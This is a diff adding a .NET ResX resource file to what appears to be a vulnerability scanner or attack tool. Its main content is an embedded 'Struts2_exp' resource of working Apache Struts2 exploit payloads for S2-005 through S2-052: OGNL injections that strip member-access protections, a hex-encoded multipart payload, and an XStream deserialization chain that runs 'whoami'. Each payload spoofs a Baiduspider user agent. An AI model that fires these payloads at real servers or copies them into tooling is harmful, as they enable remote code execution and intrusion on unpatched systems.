@@ -1,0 +1,134 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <!-- 
+    Microsoft ResX Schema 
+    
+    Version 2.0
+    
+    The primary goals of this format is to allow a simple XML format 
+    that is mostly human readable. The generation and parsing of the 
+    various data types are done through the TypeConverter classes 
+    associated with the data types.
+    
+    Example:
+    
+    ... ado.net/XML headers & schema ...
+    <resheader name="resmimetype">text/microsoft-resx</resheader>
+    <resheader name="version">2.0</resheader>
+    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
+    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
+    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
+    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
+    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
+        <value>[base64 mime encoded serialized .NET Framework object]</value>
+    </data>
+    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
+        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
+        <comment>This is a comment</comment>
+    </data>
+                
+    There are any number of "resheader" rows that contain simple 
+    name/value pairs.
+    
+    Each data row contains a name, and value. The row also contains a 
+    type or mimetype. Type corresponds to a .NET class that support 
+    text/value conversion through the TypeConverter architecture. 
+    Classes that don't support this are serialized and stored with the 
+    mimetype set.
+    
+    The mimetype is used for serialized objects, and tells the 
+    ResXResourceReader how to depersist the object. This is currently not 
+    extensible. For a given mimetype the value must be set accordingly:
+    
+    Note - application/x-microsoft.net.object.binary.base64 is the format 
+    that the ResXResourceWriter will generate, however the reader can 
+    read any of the formats listed below.
+    
+    mimetype: application/x-microsoft.net.object.binary.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+            : and then encoded with base64 encoding.
+    
+    mimetype: application/x-microsoft.net.object.soap.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
+            : and then encoded with base64 encoding.
+
+    mimetype: application/x-microsoft.net.object.bytearray.base64
+    value   : The object must be serialized into a byte array 
+            : using a System.ComponentModel.TypeConverter
+            : and then encoded with base64 encoding.
+    -->
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="metadata">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" />
+              </xsd:sequence>
+              <xsd:attribute name="name" use="required" type="xsd:string" />
+              <xsd:attribute name="type" type="xsd:string" />
+              <xsd:attribute name="mimetype" type="xsd:string" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="assembly">
+            <xsd:complexType>
+              <xsd:attribute name="alias" type="xsd:string" />
+              <xsd:attribute name="name" type="xsd:string" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+  <resheader name="resmimetype">
+    <value>text/microsoft-resx</value>
+  </resheader>
+  <resheader name="version">
+    <value>2.0</value>
+  </resheader>
+  <resheader name="reader">
+    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <resheader name="writer">
+    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+  <data name="Newtonsoft_Json_net2_0" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Newtonsoft.Json.net2.0.gzip;System.Byte[], mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="Struts2_exp" xml:space="preserve">
+    <value>{"FormatUrl":false,"Name":"Struts2_S005","Language":"JAVA","Verification":{"Type":1,"Context":"&lt;dir&gt;((/)|([a-zA-Z]\\:)).*?&lt;/dir&gt;","Calc":"匹配"},"Status":1,"ExpContext":{"Method":"POST","Encode":"UTF-8","Header":{"Accept":"*/*","UserAgent":"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)","Content-Type":"application/x-www-form-urlencoded"},"Body":"('\\43_memberAccess.allowStaticMethodAccess')\n(a)=true&amp;(b)\n(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))\n&amp;('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))\n&amp;(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))\n&amp;(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))\n&amp;(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))\n&amp;(i95)(('\\43xman.getWriter().println(%22&lt;dir&gt;%22\\53\\43req.getRealPath(%22\\u005c%22)\\53%22&lt;\\57dir&gt;%22)')(d))\n&amp;(i99)(('\\43xman.getWriter().close()')(d))"}}
+{"FormatUrl":false,"Name":"Struts2_S016","Language":"JAVA","Verification":{"Type":1,"Context":"&lt;dir&gt;((/)|([a-zA-Z]\\:)).*?&lt;/dir&gt;","Calc":"匹配"},"Status":1,"ExpContext":{"Method":"POST","Encode":"UTF-8","Header":{"Accept":"*/*","UserAgent":"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)","Content-Type":"application/x-www-form-urlencoded"},"Body":"redirect%3A%24%7B%23req%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')%2C%23a%3D%23req.getSession()%2C%23b%3D%23a.getServletContext()%2C%23c%3D%23b.getRealPath(%22%2F%22)%2C%23matt%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C%23matt.getWriter().println(%22%3Cdir%3E%22%2B%23c%2B%22%3C%2Fdir%3E%22)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D"}}
+{"FormatUrl":false,"Name":"Struts2_S019","Language":"JAVA","Verification":{"Type":1,"Context":"&lt;dir&gt;((/)|([a-zA-Z]\\:)).*?&lt;/dir&gt;","Calc":"匹配"},"Status":1,"ExpContext":{"Method":"POST","Encode":"UTF-8","Header":{"Accept":"*/*","UserAgent":"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)","Content-Type":"application/x-www-form-urlencoded"},"Body":"debug=command&amp;expression=%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22&lt;dir&gt;%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().print(%22&lt;/dir&gt;%22),%23resp.getWriter().flush(),%23resp.getWriter().close()"}}
+{"FormatUrl":false,"Name":"Struts2_S032","Language":"JAVA","Verification":{"Type":1,"Context":"&lt;dir&gt;((/)|([a-zA-Z]\\:)).*?&lt;/dir&gt;","Calc":"匹配"},"Status":1,"ExpContext":{"Method":"POST","Encode":"UTF-8","Header":{"Accept":"*/*","UserAgent":"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)","Content-Type":"application/x-www-form-urlencoded"},"Body":"method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23parameters.start[0]),%23w.print(%23path),%23w.print(%23parameters.end[0]),1?%23xx:%23request.toString&amp;pp=%2f&amp;encoding=UTF-8&amp;start=%3cdir%3e&amp;end=%3c/dir%3e"}}
+{"FormatUrl":false,"Name":"Struts2_S045","Language":"JAVA","Verification":{"Type":1,"Context":"&lt;dir&gt;((/)|([a-zA-Z]\\:)).*?&lt;/dir&gt;","Calc":"匹配"},"Status":1,"ExpContext":{"Method":"GET","Encode":"UTF-8","Header":{"Accept":"image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*","UserAgent":"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)","Content-Type":"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')).(#resp=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')).(#dir=#req.getSession().getServletContext().getRealPath(\"/\")).(#resp.getWriter().print('&lt;dir&gt;'+#dir+'&lt;/dir&gt;')).(#resp.getWriter().flush()).(#resp.getWriter().close())}"},"Body":"a"}}
+{"FormatUrl":false,"Name":"Struts2_S046","Language":"JAVA","Verification":{"Type":1,"Context":"&lt;dir&gt;((/)|([a-zA-Z]\\:)).*?&lt;/dir&gt;","Calc":"匹配"},"Status":1,"ExpContext":{"Method":"POST","Encode":"UTF-8","Header":{"Accept":"*/*","UserAgent":"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)","Content-Type":"multipart/form-data;boundary=03024200-5dcc-4da7-bf66-7b2da568aa61"},"Body":"2d2d30333032343230302d356463632d346461372d626636362d3762326461353638616136310d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c65223b2066696c656e616d653d22257b2823663d276d756c7469706172742f666f726d2d6461746127292e28236d613d406f676e6c2e4f676e6c436f6e746578744044454641554c545f4d454d4245525f414343455353292e28235f6d656d6265724163636573733f28235f6d656d6265724163636573733d236d61293a282823636f6e7461696e65723d23636f6e746578745b27636f6d2e6f70656e73796d70686f6e792e78776f726b322e416374696f6e436f6e746578742e636f6e7461696e6572275d292e28235f6d656d6265724163636573735b27616c6c6f775374617469634d6574686f64416363657373275d3d74727565292e28236f676e6c5574696c3d23636f6e7461696e65722e676574496e7374616e63652840636f6d2e6f70656e73796d70686f6e792e78776f726b322e6f676e6c2e4f676e6c5574696c40636c61737329292e28236f676e6c5574696c2e6765744578636c756465645061636b6167654e616d657328292e636c6561722829292e28236f676e6c5574696c2e6765744578636c75646564436c617373657328292e636c6561722829292e2823636f6e746578742e7365744d656d62657241636365737328236d61292929292e28237265713d406f72672e6170616368652e737472757473322e536572766c6574416374696f6e436f6e7465787440676574526571756573742829292e2823706174683d273c6469723e272b237265712e67657453657373696f6e28292e676574536572766c6574436f6e7465787428292e6765745265616c5061746828272f27292b273c2f6469723e27292e28236269733d6e6577206a6176612e696f2e427974654172726179496e70757453747265616d2823706174682e676574427974657328275554462d38272929292e2823726f733d28406f72672e6170616368652e737472757473322e536572766c6574416374696f6e436f6e7465787440676574526573706f6e736528292e6765744f757470757453747265616d282929292e28406f72672e6170616368652e636f6d6d6f6e732e696f2e494f5574696c7340636f707928236269732c23726f7329292e2823726f732e666c7573682829297d00783030220d0a436f6e74656e742d547970653a20746578742f706c61696e3b20636861727365743d5554462d380d0a0d0a646174610d0a2d2d30333032343230302d356463632d346461372d626636362d3762326461353638616136312d2d0d0a","IsHex":true}}
+{"FormatUrl":false,"Name":"Struts2_S048","Language":"JAVA","Verification":{"Type":1,"Context":"&lt;dir&gt;((/)|([a-zA-Z]\\:)).*?&lt;/dir&gt;","Calc":"匹配"},"Status":1,"ExpContext":{"Method":"GET","Encode":"UTF-8","Header":{"Accept":"*/*","UserAgent":"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)","Content-Type":"%{(#szgx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#ros.print('&lt;dir&gt;'+#req.getSession().getServletContext().getRealPath('/')+'&lt;/dir&gt;')).(#ros.close())}"},"Body":""}}
+{"FormatUrl":false,"Name":"Struts2_S052","Language":"JAVA","Verification":{"Type":1,"Context":"org.apache.struts2.rest.RestActionInvocation.invoke","Calc":"包含"},"Status":1,"ExpContext":{"Method":"POST","Encode":"UTF-8","Header":{"Accept":"*/*","UserAgent":"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)","Content-Type":"application/xml"},"Body":"&lt;map&gt; \n&lt;entry&gt; \n&lt;jdk.nashorn.internal.objects.NativeString&gt; \n\t&lt;flags&gt;0&lt;/flags&gt; \n\t&lt;value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\"&gt; \n\t\t&lt;dataHandler&gt; \n\t\t\t&lt;dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\"&gt; \n\t\t\t\t&lt;is class=\"javax.crypto.CipherInputStream\"&gt; \n\t\t\t\t\t&lt;cipher class=\"javax.crypto.NullCipher\"&gt; \n\t\t\t\t\t\t&lt;initialized&gt;false&lt;/initialized&gt; \n\t\t\t\t\t\t&lt;opmode&gt;0&lt;/opmode&gt; \n\t\t\t\t\t\t&lt;serviceIterator class=\"javax.imageio.spi.FilterIterator\"&gt;\n\t\t\t\t\t\t\t&lt;iter class=\"javax.imageio.spi.FilterIterator\"&gt; \n\t\t\t\t\t\t\t&lt;iter class=\"java.util.Collections$EmptyIterator\"/&gt; \n\t\t\t\t\t\t\t\t&lt;next class=\"java.lang.ProcessBuilder\"&gt; \n\t\t\t\t\t\t\t\t\t&lt;command&gt; \n\t\t\t\t\t\t\t\t\t\t&lt;string&gt;whoami&lt;/string&gt;\n\t\t\t\t\t\t\t\t\t\t&lt;string&gt;&lt;/string&gt; \n\t\t\t\t\t\t\t\t\t&lt;/command&gt; \n\t\t\t\t\t\t\t\t\t&lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; \n\t\t\t\t\t\t\t\t&lt;/next&gt; \n\t\t\t\t\t\t\t&lt;/iter&gt; \n\t\t\t\t\t\t\t&lt;filter class=\"javax.imageio.ImageIO$ContainsFilter\"&gt; \n\t\t\t\t\t\t\t\t&lt;method&gt; \n\t\t\t\t\t\t\t\t\t&lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;\n\t\t\t\t\t\t\t\t\t&lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; \n\t\t\t\t\t\t\t\t&lt;/method&gt; \n\t\t\t\t\t\t\t\t&lt;name&gt;foo&lt;/name&gt; \n\t\t\t\t\t\t\t&lt;/filter&gt; \n\t\t\t\t\t\t\t&lt;next class=\"string\"&gt;foo&lt;/next&gt; \n\t\t\t\t\t\t&lt;/serviceIterator&gt; \n\t\t\t\t\t\t&lt;lock/&gt; \n\t\t\t\t\t\t&lt;/cipher&gt; \n\t\t\t\t\t\t&lt;input class=\"java.lang.ProcessBuilder$NullInputStream\"/&gt; \n\t\t\t\t\t\t&lt;ibuffer&gt;&lt;/ibuffer&gt; \n\t\t\t\t\t\t&lt;done&gt;false&lt;/done&gt; \n\t\t\t\t\t\t&lt;ostart&gt;0&lt;/ostart&gt; \n\t\t\t\t\t\t&lt;ofinish&gt;0&lt;/ofinish&gt; \n\t\t\t\t\t\t&lt;closed&gt;false&lt;/closed&gt; \n\t\t\t\t&lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; \n\t\t\t&lt;/dataSource&gt; &lt;transferFlavors/&gt; \n\t\t&lt;/dataHandler&gt;\n\t\t&lt;dataLen&gt;0&lt;/dataLen&gt; \n\t&lt;/value&gt; \n&lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/&gt; \n&lt;/entry&gt; &lt;entry&gt; \n&lt;jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/&gt; \n&lt;jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/&gt; \n&lt;/entry&gt; \n&lt;/map"}}</value>
+  </data>
+</root>
